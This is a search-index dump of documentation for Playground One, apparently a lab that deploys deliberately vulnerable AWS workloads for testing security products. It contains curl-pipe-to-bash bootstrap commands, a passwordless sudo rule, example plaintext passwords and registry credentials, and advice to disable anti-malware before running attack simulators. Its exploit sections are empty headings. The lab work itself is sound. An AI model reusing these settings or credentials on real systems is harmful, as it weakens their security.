\"ssh -i ../playground-key-pair.pem -o StrictHostKeyChecking=no admin@3.75.219.198\"\nssh_instance_web1 = \"ssh -i ../playground-key-pair.pem -o StrictHostKeyChecking=no ubuntu@18.197.106.33\"\npublic_instance_password_srv1 = \"4h1v}Q7Hc9tbGWdM\"\n</code></pre> <p>With this you can always query how to connect to your running EC2 instances. All instances support SSH connections, the Windows Server Remote Desktop as well. For RDP Use the configured <code>admin</code> user, the ip address and password for srv1.</p>"},{"location":"getting-started/life-cycle/#play-with-the-playground-one","title":"Play with the Playground One","text":"<p>It's a playground, or? Experiment and hopefully learn a few things. For your guidance, there are some prepared scenarios for you to go through. Find them in the navigation pane.</p>"},{"location":"getting-started/life-cycle/#tear-down","title":"Tear Down","text":"<p>If you want to destroy your environment completely or only parts of it</p> <pre><code>pgo --destroy &lt;configuration&gt;\n</code></pre> <p>If you want to tear down everything run</p> <pre><code>pgo --destroy all\n</code></pre> <p>Note: The network and VPC are not automatically destroyed. You can do this manually by running <code>pgo --destroy nw</code>. Be sure to have the CloudFormation stack of XDR for Containers deleted before doing so. Otherwise it will be in a fail (blackhole) state.</p>"},{"location":"getting-started/prepare/","title":"Getting Started","text":"<p>Choose the platform documentation</p>"},{"location":"getting-started/prepare/#ubuntu","title":"Ubuntu","text":"<p>Follow this chapter if...</p> <ul> <li>you're using the Playground on a Ubuntu machine (not Cloud9)</li> </ul> <p>Test if <code>sudo</code> requires a password by running <code>sudo ls /etc</code>. If you don't get a password prompt you're fine, otherwise run.</p> <pre><code>sudo visudo -f /etc/sudoers.d/custom-users\n</code></pre> <p>Add the following line:</p> <pre><code>&lt;YOUR USER NAME&gt; ALL=(ALL) NOPASSWD:ALL </code></pre> <p>Note: Ensure that you are authenticated to AWS on your Ubuntu server. If not, run <code>aws configure</code> before proceeding.</p> <p>Now, run the Playground</p> <pre><code>curl -fsSL https://raw.githubusercontent.com/mawinkler/playground-one/main/bin/pgo | bash &amp;&amp; exit\n</code></pre> <p>The bootstrapping process will exit your current terminal or shell after it has done it's work. Depending on your environment just create a new terminal session and continue with Configuration.</p>"},{"location":"getting-started/prepare/#cloud9","title":"Cloud9","text":"<p>Follow this chapter if...</p> <ul> <li>you're using the Playground on a AWS Cloud9 environment</li> </ul> <p>Follow the steps below to create a Cloud9 suitable for the Playground.</p> <ul> <li>Point your browser to AWS</li> <li>Choose your default AWS region in the top right</li> <li>Go to the Cloud9 service</li> <li>Select <code>[Create Cloud9 environment]</code></li> <li>Name it as you like</li> <li>Choose <code>[t3.medium]</code> for instance type and</li> <li><code>Ubuntu 22.04 LTS</code> as the platform</li> <li>For the rest take all default values and click <code>[Create environment]</code></li> </ul> <p>Update IAM Settings for the Workspace</p> <ul> <li>Click the gear icon (in top right corner), or click to open a new tab and choose <code>[Open Preferences]</code></li> <li>Select AWS SETTINGS</li> <li>Turn OFF <code>[AWS managed temporary credentials]</code></li> <li>Close the Preferences tab</li> </ul> <p>Now, run the Playground</p> <pre><code>curl -fsSL https://raw.githubusercontent.com/mawinkler/playground-one/main/bin/pgo | bash &amp;&amp; exit\n</code></pre> <p>If you run the above command on a newly created or rebooted Cloud9 instance and are receiving the following error, just wait a minute or two and rerun the curl command. The reason for this error is, that directly after starting the machine some update processes are running in the background causing the lock to the package manager process.</p> <pre><code>E: Could not get lock /var/lib/dpkg/lock-frontend - open (11: Resource temporarily unavailable)\nE: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?\n</code></pre> <p>You will be asked for your AWS credentials. They will never be stored on disk and get removed from memory after creating and assigning an instance role to the Cloud9 instance.</p> <p>If you forgot to disable AWS managed temporary credentials you will asked to do it again.</p> <p>The bootstrapping process will exit your current terminal or shell after it has done it's work. Depending on your environment just create a new terminal session and continue with Configuration.</p>"},{"location":"how-it-works/configurations/","title":"Playground One Configurations","text":"<p>The Playground One has a modular structure as shown in the following tree:</p> <pre><code>awsone\n\u251c\u2500\u2500 network (2-network)\n|\u00a0\u00a0 \u251c\u2500\u2500 ec2 (3-instances)\n|\u00a0\u00a0 \u251c\u2500\u2500 eks (4-cluster-eks-ec2)\n|\u00a0\u00a0 |   \u251c\u2500\u2500 eks-deployments (8-cluster-eks-ec2-deployments)\n|\u00a0\u00a0 |   \u2514\u2500\u2500 scenarios (7-scenarios-ec2)\n|\u00a0\u00a0 \u251c\u2500\u2500 eks (4-cluster-eks-fargate)\n|\u00a0\u00a0 |   \u2514\u2500\u2500 scenarios (7-scenarios-fargate)\n|   \u2514\u2500\u2500 ecs (5-cluster-ecs)\n\u2514\u2500\u2500 dsm (9-deep-security)\n</code></pre> <p>As we can see, the configuration <code>network</code> is the base for the other configurations. It creates the VPC, Subnets, Route Tables, Security Groups, etc. One can choose to only create the EKS cluster, or ECS cluster, or even the full stack. Everything will reside in the same VPC.</p> <p>Architecture: Example environment name <code>pgo8</code></p> <p></p> <p>Security Groups: Example environment name <code>pgo8</code></p> <p></p> <p>The following chapters describe the different configurations on a high level, refer the the dedicated documentation for more details.</p>"},{"location":"how-it-works/configurations/#virtual-private-cloud-and-network","title":"Virtual Private Cloud and Network","text":"<p>Configuration located in <code>awsone/2-network</code></p> <p>This configuration defines a network with the most commonly used architecture, private and public subnets accross three availability zones. It includes everything what a VPC should have, this is amongst others an internet gateway, NAT gateway, security groups, etc. Since a VPC is cheap there's no real need to destroy the networking configuration everyday, just leave it as it is and reuse it the next time. This eases the handling of other components like Vision One XDR for Containers.</p>"},{"location":"how-it-works/configurations/#virtual-instances","title":"Virtual Instances","text":"<p>Configuration located in <code>awsone/3-instances</code></p> <p>Depends on <code>awsone/2-network</code></p> <p>Basically, a couple of EC2 instances are created with this configuration. Currently these are two linux and one windows instances.</p> <p>If you store the agent installers for Server and Workload Security in <code>0-files</code> the instances will connect to Vision One.</p> <p>You can optionally drop any file or installer in the <code>0-files</code> directory which will then be available in the ec2 instances download folder.</p>"},{"location":"how-it-works/configurations/#eks-ec2-cluster","title":"EKS EC2 Cluster","text":"<p>Configuration located in <code>awsone/4-cluster-eks-ec2</code></p> <p>Depends on <code>awsone/2-network</code></p> <p>So, this is my favorite part. This configuration creates an EKS cluster with some nice key features:</p> <ul> <li>Autoscaling from 1 to 10 nodes</li> <li>Nodes running as Spot instances to save money :-)</li> <li>ALB Load Balancer controller</li> <li>Kubernetes Autoscaler</li> <li>Cluster is located in the private subnets</li> </ul>"},{"location":"how-it-works/configurations/#eks-fargate-cluster","title":"EKS Fargate Cluster","text":"<p>Configuration located in <code>awsone/4-cluster-eks-fargate</code></p> <p>Depends on <code>awsone/2-network</code></p> <p>This configuration creates a Fargate EKS cluster with some nice key features:</p> <ul> <li>100% Fargate</li> <li>Nodes running as Spot instances to save money :-)</li> <li>An additional AWS managed node group</li> <li>Cluster is located in the private subnets</li> </ul>"},{"location":"how-it-works/configurations/#cluster-deployments","title":"Cluster Deployments","text":"<p>Configuration located in <code>awsone/8-cluster-ec2-deployments</code></p> <p>Depends on <code>awsone/4-cluster-eks-ec2</code></p> <p>Currently, the following deployments are defined:</p> <ul> <li>Container Security</li> <li>Calico</li> <li>Prometheus &amp; Grafana</li> <li>Trivy</li> </ul>"},{"location":"how-it-works/configurations/#scenarios-for-eks-ec2","title":"Scenarios for EKS EC2","text":"<p>Configuration located in <code>awsone/7-scenarios-ec2</code></p> <p>Depends on <code>awsone/4-cluster-eks-ec2</code></p> <p>Currently, the following (vulnerable) deployments are defined:</p> <ul> <li>WebApp System-Monitor (see Escape to the Host System)</li> <li>WebApp Health-Check (see ContainerD Abuse)</li> <li>WebApp Hunger-Check (see Hunger Check)</li> <li>Java-Goof</li> <li>WebApp OpenSSL3</li> <li>Nginx</li> </ul> <p>Automated attacks are running every full hour.</p>"},{"location":"how-it-works/configurations/#scenarios-for-eks-fargate","title":"Scenarios for EKS Fargate","text":"<p>Configuration located in <code>awsone/7-scenarios-fargate</code></p> <p>Depends on <code>awsone/4-cluster-eks-fargate</code></p> <p>Currently, the following (vulnerable) deployments are defined:</p> <ul> <li>Nginx</li> </ul> <p>Automated attacks are running every full hour.</p>"},{"location":"how-it-works/configurations/#ecs-clusters","title":"ECS Clusters","text":"<p>Configuration located in <code>awsone/5-cluster-ecs</code></p> <p>Depends on <code>awsone/2-network</code></p> <p>Here we're building an ECS cluster using EC2 instances and/or Fargate profile. Key features:</p> <ul> <li>Autoscaling group for spot instances when using the EC2 variant. On-demand autoscaler can be enabled in Terraform script.</li> <li>Fargate profile with spot instances. Fargate with on-demand instances can be enabled in Terraform script.</li> <li>ALB Load Balancer</li> <li>Automatic deployment of a vulnerable service (Java-Goof)</li> </ul>"},{"location":"how-it-works/configurations/#deep-security","title":"Deep Security","text":"<p>Configuration located in <code>awsone/9-deep-security</code></p> <p>This configuration is to simulate an on-premise Deep Security environment meant to be used in integration and migration scenarios. For simulation purposes it creates a dedicated VPC with the most commonly used architecture, private and public subnets accross two availability zones. It includes everything what a VPC should have, this is amongst others an internet gateway, NAT gateway, security groups, etc.</p> <p>To come:</p> <ul> <li>Documentation of integraion scenarios:</li> <li>DS with V1ES</li> <li>WS with V1ES</li> <li>Documentation of migration scenarios:</li> <li>DS --&gt; V1ES</li> <li>WS --&gt; V1ES</li> <li>Creation of protected instances and policies.</li> </ul>"},{"location":"how-it-works/orchestration/","title":"Orchestration","text":""},{"location":"how-it-works/orchestration/#how-it-works","title":"How it works","text":"<p>The Playground One utilizes Terraform to maintain the environment. For best flexibility and cost optimization it is structured into several Terraform configurations. You can also view these configurations as modules that can be linked together as needed.</p> <p>Note: Currently, the only cloud supported is AWS, when required other public cloud providers might follow.</p>"},{"location":"how-it-works/orchestration/#what-is-terraform","title":"What is Terraform?","text":"<p>Terraform is an infrastructure as code tool that lets you build, change, and version cloud and on-prem resources safely and efficiently. It is maintained by HashiCorp.</p> <p>HashiCorp Terraform is an infrastructure as code tool that lets you define both cloud and on-prem resources in human-readable configuration files that you can version, reuse, and share. You can then use a consistent workflow to provision and manage all of your infrastructure throughout its lifecycle. Terraform can manage low-level components like compute, storage, and networking resources, as well as high-level components like DNS entries and SaaS features.</p>"},{"location":"how-it-works/orchestration/#how-does-terraform-work","title":"How does Terraform work?","text":"<p>Terraform creates and manages resources on cloud platforms and other services through their application programming interfaces (APIs). Providers enable Terraform to work with virtually any platform or service with an accessible API.</p> <p></p> <p>HashiCorp and the Terraform community have already written thousands of providers to manage many different types of resources and services. You can find all publicly available providers on the Terraform Registry, including Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, and many more.</p> <p></p> <p>The core Terraform workflow consists of three stages:</p> <p>Write: You define resources, which may be across multiple cloud providers and services. For example, you might create a configuration to deploy an application on virtual machines in a Virtual Private Cloud (VPC) network with security groups and a load balancer.</p> <p>Plan: Terraform creates an execution plan describing the infrastructure it will create, update, or destroy based on the existing infrastructure and your configuration.</p> <p>Apply: On approval, Terraform performs the proposed operations in the correct order, respecting any resource dependencies. For example, if you update the properties of a VPC and change the number of virtual machines in that VPC, Terraform will recreate the VPC before scaling the virtual machines.</p>"},{"location":"integrations/container-security/","title":"Vision One Container Security","text":""},{"location":"integrations/container-security/#container-security-with-the-playground-one-eks-ec2-cluster","title":"Container Security with the Playground One EKS EC2 Cluster","text":"<p>This guide provides step-by-step instructions on how to deploy Vision One Container Security on a Playground One EKS EC2 cluster.</p> <p>There is currently no way to fully automate the Vision One Container Security deployment the an EKS cluster. This process will be automated in the near future so that Vision One Container Security can be deployed via Terraform.</p> <p>Prerequisites:</p> <ul> <li>Deployed eks cluster configuration (<code>pgo -a eks-ec2</code>).</li> </ul> <p>Required information:</p> <ul> <li>EKS Cluster ARN from eks outputs (<code>pgo -o eks-ec2</code>).</li> </ul> <p>Steps:</p> <ol> <li>Head over to <code>Cloud Security Operations --&gt; Container Security --&gt; Container Inventory</code>.</li> <li>Select <code>[Kubernetes] --&gt; [+ Add Cluster]</code>.</li> <li>Type in a name to use to identify the cluster.</li> <li>Set <code>Map to Cloud Account</code> to <code>Yes</code> and paste the cluster ARN from the outputs of the <code>eks</code>-configuration.</li> <li>Click the <code>Runtime Scanning</code> switch to enable Runtime Vulnerability Scanning.</li> <li>Click the <code>Runtime Security</code> switch to enable Runtime Security protection.</li> <li>Clich <code>[Next]</code> to create the cluster in the inventory view.</li> <li>Download the generated <code>overrides.yaml</code>, copy/paste the <code>helm install</code> command to your terminal, and run the command. This will deploy Vision One Container Security to your EKS cluster.</li> </ol> <p>Done.</p>"},{"location":"integrations/container-security/#container-security-with-the-playground-one-eks-fargate-cluster","title":"Container Security with the Playground One EKS Fargate Cluster","text":"<p>This guide provides step-by-step instructions on how to deploy Vision One Container Security on a Playground One EKS Fargate cluster.</p> <p>There is currently no way to fully automate the Vision One Container Security deployment the an EKS cluster. This process will be automated in the near future so that Vision One Container Security can be deployed via Terraform.</p> <p>Prerequisites:</p> <ul> <li>Deployed eks cluster configuration (<code>pgo -a eks-fg</code>).</li> </ul> <p>Required information:</p> <ul> <li>EKS Cluster ARN from eks outputs (<code>pgo -o eks-fg</code>).</li> </ul> <p>Steps:</p> <ol> <li>Head over to <code>Cloud Security Operations --&gt; Container Security --&gt; Container Inventory</code>.</li> <li>Select <code>[Kubernetes] --&gt; [+ Add Cluster]</code>.</li> <li>Type in a name to use to identify the cluster.</li> <li>Set <code>Map to Cloud Account</code> to <code>Yes</code> and paste the cluster ARN from the outputs of the <code>eks</code>-configuration.</li> <li>Click the <code>Runtime Scanning</code> switch to enable Runtime Vulnerability Scanning.</li> <li>Click the <code>Runtime Security</code> switch to enable Runtime Security protection.</li> <li>Clich <code>[Next]</code> to create the cluster in the inventory view.</li> <li>Click the <code>Fargate environment</code> switch to enable Fargate support.</li> <li>Download the generated <code>overrides.yaml</code>, copy/paste the <code>helm install</code> command to your terminal, and run the command. This will deploy Vision One Container Security to your EKS cluster.</li> </ol> <p>Done.</p>"},{"location":"integrations/container-security/#container-security-with-the-playground-one-ecs-fargate-cluster","title":"Container Security with the Playground One ECS Fargate Cluster","text":"<p>If you are deploying Container Security in an ECS Fargate environment, you have to carry out some additional steps after adding the instance. See official documentation for the details.</p> <p>Playground One simplifies these steps.</p> <p>Prerequisites:</p> <ul> <li>Deployed ECS Fargate cluster configuration (<code>pgo -a ecs</code>).</li> </ul> <p>Required information:</p> <ul> <li>ECS Fargate Cluster name from ecs outputs (<code>pgo -o ecs</code>).</li> </ul> <p>Steps:</p> <ol> <li>On Vision One, head over to <code>Cloud Security Operations --&gt; Container Security --&gt; Container Inventory</code>.</li> <li>Select <code>[Amazon ECS] --&gt; [Account ID] --&gt; [Region] --&gt; [Your ECS Fargate Cluster]</code>.</li> <li>Select a Policy and enable Runtime Security.</li> <li>Run <code>ecsfg-add-v1cs &lt;CLUSTER NAME&gt;</code></li> </ol> <p>Done.</p> <p>Note: Deletion of the cluster via <code>pgo -d ecs</code> will fail until you manually delete the <code>trendmicro-scout</code>-service in the ECS console. Then delete the cluster in the console. There will be an IAM policy starting with your cluster name not being deleted automatically.</p>"},{"location":"integrations/deep-security/","title":"Deep Security","text":"<p>This configuration is to simulate an on-premise Deep Security environment meant to be used in integration and migration scenarios. For simulation purposes it creates a dedicated VPC with the most commonly used architecture, private and public subnets accross two availability zones. It includes everything what a VPC should have, this is amongst others an internet gateway, NAT gateway, security groups, etc.</p> <p>The Deep Security Manager is deployed to the private subnet with port <code>4119</code> exposed. It uses an AWS RDS PostgreSQL in the private subnet. Access to Deep Security is granted by the help of a bastion host in the public subnet. This host supports ssh tunneling and acts as an upstream proxy on port 4119.</p> <p>To create a Deep Security instance run</p> <pre><code>pgo --apply dsm\n</code></pre> <p>To destroy the instance run</p> <pre><code>pgo --destroy dsm\n</code></pre> <p>An applied dsm configuration can be quickly stopped and started via the commands <code>dsm stop</code> and <code>dsm start</code> without losing any configurations within Deep Security.</p> <p>To come:</p> <ul> <li>Documentation of integraion scenarios:</li> <li>DS with V1ES</li> <li>WS with V1ES</li> <li>Documentation of migration scenarios:</li> <li>DS --&gt; V1ES</li> <li>WS --&gt; V1ES</li> <li>Creation of protected instances and policies.</li> </ul>"},{"location":"integrations/endpoint-security/","title":"Vision One Endpoint Security Server &amp; Workload Protection","text":"<p>Three different instances are currently provided by the Playground One with different configurations:</p> <p>Instance Web1:</p> <ul> <li>Ubuntu Linux 20.04</li> <li>Nginx deployment</li> <li>Vision One Endpoint Security Basecamp agent for Server &amp; Workload Protection</li> </ul> <p>Instance Db1:</p> <ul> <li>Ubuntu Linux 20.04</li> <li>MySql databse</li> <li>Vision One Endpoint Security Basecamp agent for Server &amp; Workload Protection</li> </ul> <p>Instance Srv1:</p> <ul> <li>Windows Server 2022 Standalone Server</li> <li>Vision One Endpoint Security Basecamp agent for Server &amp; Workload Protection</li> </ul> <p>All instances can be integrated with Vision One Endpoint Security for Server &amp; Workload Protection and have access to the Atomic Launcher (if provided).</p> <p>The instances are created within a public subnet of Playground One's VPC. They all get an EC2 instance role assigned providing them the ability to access installer packages stored within an S3 bucket.</p> <p>All instances including the Windows Server are accessible via ssh and key authentication. RDP for Windows is supported in addition to this.</p> <p>Server &amp; Workload Protection: Example with full stack deployment</p> <p></p>"},{"location":"integrations/endpoint-security/#optional-drop-vision-one-installer-packages","title":"Optional: Drop Vision One Installer Packages","text":"<p>If you want the instances automatically to be activated against your Server and Workload Protection Manager instance you need to download the installer packages for Vision One Endpoint Security for Windows and/or Linux from your Vision One instance. You need to do this manually since these installers are specific to your environment.</p> <p>The downloaded files are named something similar like</p> <p><code>TMServerAgent_Windows_auto_64_Server_and_Workload_Protection_Manager_-_CLOUDONE-ID.zip</code></p> <p>and/or</p> <p><code>TMServerAgent_Linux_auto_64_Server_and_Workload_Protection_Manager_-CLOUDONE-ID.tar</code>.</p> <p>Rename them to <code>TMServerAgent_Linux.tar</code> and <code>TMServerAgent_Windows.zip</code> respectively and copy the file(s) to <code>${ONEPATH}/awsone/0-files</code>.</p>"},{"location":"integrations/endpoint-security/#optional-server-workload-protection-event-based-tasks","title":"Optional: Server &amp; Workload Protection Event-Based Tasks","text":"<p>Create Event-Based Tasks to automatically assign Linux or Windows server policies to the machines.</p> <p>Agent-initiated Activation Linux</p> <ul> <li>Actions: Assign Policy: Linux Server</li> <li>Conditions: \"Platform\" matches \".*Linux.*\"</li> </ul> <p>Agent-initiated Activation Windows</p> <ul> <li>Actions: Assign Policy: Windows Server</li> <li>Conditions: \"Platform\" matches \".*Windows.*\"</li> </ul>"},{"location":"integrations/endpoint-security/#optional-drop-atomic-launcher-packages","title":"Optional: Drop Atomic Launcher Packages","text":"<p>If you want to experiment with Atomic Launcher download the packages from here and store them in the  <code>${ONEPATH}/awsone/0-files</code> directory as well.</p> <p>Your <code>${ONEPATH}/awsone/0-files</code>-directory should look like this:</p> <pre><code>-rw-rw-r-- 1 user user 17912014 Aug  1 14:50 atomic_launcher_linux_1.0.0.1009.zip\n-rw-rw-r-- 1 user user 96135367 Aug  1 14:50 atomic_launcher_windows_1.0.0.1013.zip\n-rw-rw-r-- 1 user user        0 Jul 28 06:22 see_documentation\n-rw-rw-r-- 1 user user      144 Aug  1 14:33 TMServerAgent_Linux_deploy.sh\n-rw-rw-r-- 1 user user 27380224 Aug  1 14:50 TMServerAgent_Linux.tar\n-rw-rw-r-- 1 user user     1145 Aug  1 14:33 TMServerAgent_Windows_deploy.ps1\n-rw-rw-r-- 1 user user  3303522 Aug  1 14:50 TMServerAgent_Windows.zip\n</code></pre> <p>The Atomic Launcher is stored within the downloads folder of each of the instances.</p> <p>The unzip password is <code>virus</code>.</p> <p>You should disable Anti Malware protection und set the IPS module to detect only before using Atomic Launcher :-).</p>"},{"location":"integrations/prometheus-grafana/","title":"Prometheus and Grafana","text":""},{"location":"integrations/prometheus-grafana/#what-is-prometheus","title":"What is Prometheus?","text":"<p>Prometheus is an open-source systems monitoring and alerting toolkit originally built at SoundCloud. Since its inception in 2012, many companies and organizations have adopted Prometheus, and the project has a very active developer and user community. It is now a standalone open source project and maintained independently of any company. To emphasize this, and to clarify the project's governance structure, Prometheus joined the Cloud Native Computing Foundation in 2016 as the second hosted project, after Kubernetes.</p> <p>Prometheus collects and stores its metrics as time series data, i.e. metrics information is stored with the timestamp at which it was recorded, alongside optional key-value pairs called labels.</p> <p>For more elaborate overviews of Prometheus, see the resources linked from the media section.</p> <p>Prometheus's main features are:</p> <ul> <li>a multi-dimensional data model with time series data identified by metric name and key/value pairs</li> <li>PromQL, a flexible query language to leverage this dimensionality</li> <li>no reliance on distributed storage; single server nodes are autonomous</li> <li>time series collection happens via a pull model over HTTP</li> <li>pushing time series is supported via an intermediary gateway</li> <li>targets are discovered via service discovery or static configuration</li> <li>multiple modes of graphing and dashboarding support</li> </ul>"},{"location":"integrations/prometheus-grafana/#what-is-grafana","title":"What is Grafana?","text":"<p>In a nutshell: Dashboard anything. Observe everything.</p> <p>Query, visualize, alert on, and understand your data no matter where it\u2019s stored. With Grafana you can create, explore, and share all of your data through beautiful, flexible dashboards.</p>"},{"location":"integrations/prometheus-grafana/#playground-one-integration","title":"Playground One Integration","text":"<p>To enable/disable the Prometheus &amp; Grafana combo and to set the administrator password run <code>pgo --configure</code>. The package comes preconfigured and ready for use.</p> <p>To get the DNS names of Prometheus and Grafana check the outputs of the EKS configuraiton with <code>pgo -o eks</code></p> <pre><code># Example\nloadbalancer_dns_grafana = \"k8s-promethe-promethe-95d61839fe-676288571.eu-central-1.elb.amazonaws.com\"\nloadbalancer_dns_prometheus = \"k8s-promethe-promethe-a040b2a261-633411715.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>Copy the Grafana URL to your browser and authenticate with <code>admin</code> and the password you have set.</p> <p>Then head over to Dashboards </p> <p></p> <p>and search for <code>kubernetes</code>:</p> <p></p> <p>Select any of the dashboards and start playing.</p> <p></p> <p>If you want to use PromQL directly, head over to the Prometheus frontend.</p>"},{"location":"integrations/xdr-for-containers/","title":"Vision One XDR for Containers","text":"<p>Note: At the time of writing, XDR for Containers is in an early preview stage and only one to be protected VPC is supported. The cluster variants provided by Playground One support Application Load Balancing which is required for XDR for Containers.</p> <p>You need to create a connection with XDR for Containers by going through the workflow in your Vision One environment.</p>"},{"location":"integrations/xdr-for-containers/#connect-xdr-for-containers-with-the-playground-one","title":"Connect XDR for Containers with the Playground One","text":"<p>Before connecting XDR for Containers you need to have the VPC and network of Playground One created already.</p> <pre><code>pgo --apply nw\n</code></pre> <p>Note: You don't need to destroy the VPC and network each time because this would mean to disconnect Vision One from it and reestablish the connection the next time. This takes about 20 minutes overall. So leave the VPC as it is.</p> <p>Required information:</p> <ul> <li>Trend Cloud One API Key</li> <li>Trend Cloud One Region</li> <li>AWS Account ID</li> <li>AWS VPC ID</li> <li>VPC Region</li> </ul> <p>Follow the deployment instructions from Vision One. You can query your <code>AWS VPC ID</code> by running <code>pgo --output nw</code>.</p> <p>Note: Make sure to deploy the stack in the region of the VPC when pressing <code>[Launch Stack]</code>.</p> <p></p> <p>All provided clusters from Playground One can be used with XDR for Containers.</p>"},{"location":"integrations/xdr-for-containers/#scenarios","title":"Scenarios","text":"<ul> <li>Tomcat Remote Code Execution</li> <li>JNDI Injection in HTTP Request</li> <li>Apache Struts Multipart Encoding Command Injection (ECS)</li> <li>Apache Struts Multipart Encoding Command Injection (EKS)</li> </ul>"},{"location":"scenarios/deploy-from-private-registry/","title":"Deploy Cloud One Container Security from a Private Registry","text":""},{"location":"scenarios/deploy-from-private-registry/#tools","title":"Tools","text":"<p>Used tools:</p> <ul> <li>Docker</li> <li>yq, awk, helm</li> </ul> <p>Get <code>yq</code></p> <pre><code>curl -L https://github.com/mikefarah/yq/releases/download/v4.24.2/yq_linux_amd64.tar.gz -o yq_linux_amd64.tar.gz\ntar xfvz yq_linux_amd64.tar.gz\nsudo cp yq_linux_amd64 /usr/local/bin/yq\n</code></pre>"},{"location":"scenarios/deploy-from-private-registry/#login-to-the-registries","title":"Login to the Registries","text":"<pre><code>export REGISTRY=172.250.255.1:5000\nexport USERNAME=admin\nexport PASSWORD=trendmicro\n\n# Login to Docker Registry\ndocker login\n\n# Login to private Registry\necho ${PASSWORD} | docker login https://${REGISTRY} --username ${USERNAME} --password-stdin\n</code></pre>"},{"location":"scenarios/deploy-from-private-registry/#container-security-pulltag-push","title":"Container Security - Pull,Tag, &amp; Push","text":"<pre><code># Enumerate the Images\ncurl -L https://github.com/trendmicro/cloudone-container-security-helm/archive/master.tar.gz -o master-cs.tar.gz\ntar xfvz master-cs.tar.gz\nexport TAG=$(yq '.images.defaults.tag' cloudone-container-security-helm-master/values.yaml)\necho ${TAG}\n# Pull Container Security images from Dockerhub.\nawk -v tag=$TAG '$1 == \"repository:\" {printf \"trendmicrocloudone/%s:%s\\n\",$2,tag;}' \\\ncloudone-container-security-helm-master/values.yaml | xargs -I {} docker pull {}\n# Tag the images with your target registry information, making sure to preserve the original image name.\nawk -v tag=$TAG '$1 == \"repository:\" {printf \"trendmicrocloudone/%s:%s\\n\",$2,tag;}' \\\ncloudone-container-security-helm-master/values.yaml | xargs -I {} docker tag {} ${REGISTRY}/{}\n# Push the images to the private registry\nawk -v tag=$TAG '$1 == \"repository:\" {printf \"trendmicrocloudone/%s:%s\\n\",$2,tag;}' \\\ncloudone-container-security-helm-master/values.yaml | xargs -I {} docker push ${REGISTRY}/{}\n# Create image pull secret\nkubectl create secret docker-registry regcred \\\n--docker-server=${REGISTRY} \\\n--docker-username=${USERNAME} \\\n--docker-password=${PASSWORD} \\\n--namespace=container-security\n</code></pre> <p>Update Container Securities <code>overrides.yaml</code> to override the default source registry with your private registry:</p> <pre><code>...\nimages:\ndefaults:\nregistry: [REGISTRY]\ntag: [TAG]\nimagePullSecret: regcred\n</code></pre> <p>Example:</p> <pre><code>...\nimages:\ndefaults:\nregistry: 172.250.255.1:5000\ntag: 2.2.9\nimagePullSecret: regcred\n</code></pre> <p>Deploy Container Security.</p> <pre><code>helm install \\\ncontainer-security \\\n--values $PGPATH/overrides.yaml \\\n--namespace trendmicro-system \\\n--install \\\nhttps://github.com/trendmicro/cloudone-container-security-helm/archive/master.tar.gz\n</code></pre>"},{"location":"scenarios/eks/","title":"EKS","text":""},{"location":"scenarios/eks/#kubernetes-autoscaling","title":"Kubernetes Autoscaling","text":"<p>Logs:</p> <pre><code>kubectl logs -f -n kube-system -l app=cluster-autoscaler\n</code></pre>"},{"location":"scenarios/privileged-shell/","title":"Scenario: Vision One Container Security Gain a Privileged Shell","text":""},{"location":"scenarios/privileged-shell/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One Container Security</li> <li>Playground One EKS EC2 Cluster</li> <li>Running app: </li> </ul>"},{"location":"scenarios/privileged-shell/#exploiting","title":"Exploiting","text":""},{"location":"scenarios/privileged-shell/#exploit","title":"Exploit","text":""},{"location":"scenarios/sentry/","title":"Sentry","text":"<p>To create findings and scan with Sentry run</p> <pre><code>$PGPATH/terraform-awsone/1-scripts/create-findings.sh\n</code></pre> <p>Feel free to have a look on the script above, but in theory it should prepare six findings for Sentry and two Workbenches in Vision One.</p> <p>To trigger Sentry scans for any instance run (example):</p> <pre><code># INSTANCE=&lt;INSTANCE_ID&gt; sentry-trigger-ebs-scan\nINSTANCE=$(terraform output -raw public_instance_ip_web1) sentry-trigger-ebs-scan\n</code></pre> <p>The scan results should show up in your Cloud One Central console.</p>"},{"location":"scenarios/server-workload-ecs-ec2-malware-upload/","title":"Scenario: Vision One XDR for Containers Detect Malware Upload","text":"<p>DRAFT</p>"},{"location":"scenarios/server-workload-ecs-ec2-malware-upload/#optional-retrieve-tenant-id-and-token-from-server-workload-protection","title":"Optional: Retrieve Tenant ID and Token from Server &amp; Workload Protection","text":"<p>You might want to know the tenant ID and token from your Server &amp; Workload Protection to continue using deployment scripts we know from Deep/Workload Security.</p> <p>To get them navigate to your instance in Vision One. Then head over to <code>Administration --&gt; Updates --&gt; Software --&gt; Local --&gt; Generate Deployment Scripts...</code></p> <p>Either copy the full script or find the tenant ID and token on the very bottom of the script.</p> <p>If you save these values to the Playground One configuration with <code>pgo -c</code> the EC2 instances of the ECS (EC2) cluster will get an agent deployed.</p>"},{"location":"scenarios/server-workload-ecs-ec2-malware-upload/#section-vision-one","title":"Section: Vision One","text":"<p>Vision One Server &amp; Workload Protection does support the deployment script functionality from Cloud One Workload Security. The ECS EC2 cluster can optionally deploy the agent using this mechanism. To enable this</p> <p>Set/update:</p> <ul> <li><code>Server &amp; Workload Protection tenant ID</code>: The tenant ID to use. If the tenant ID is omitted the Server &amp; Workload Protection configuration will be skipped.</li> <li><code>Server &amp; Workload Protection token</code>: The token to use</li> <li><code>Server &amp; Workload Protection policy ID</code>: The policy to assign</li> </ul>"},{"location":"scenarios/server-workload-ecs-ec2-malware-upload/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One XDR for Containers linked with Playground One VPC</li> <li>Playground One ECS Cluster with EC2 instances</li> <li>Running app: Java-Goof running on vulnerable Tomcat</li> <li>Server &amp; Workload Protection configuration set for</li> <li>Tenant ID</li> <li>Token</li> <li>Policy ID of policy with Anti Malware protection enabled</li> </ul> <p>Eventually set/update the Server &amp; Workload Protection configuration</p> <pre><code>pgo --config\n</code></pre> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code>pgo --apply ecs\n</code></pre>"},{"location":"scenarios/server-workload-ecs-ec2-malware-upload/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/server-workload-ecs-ec2-malware-upload/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> 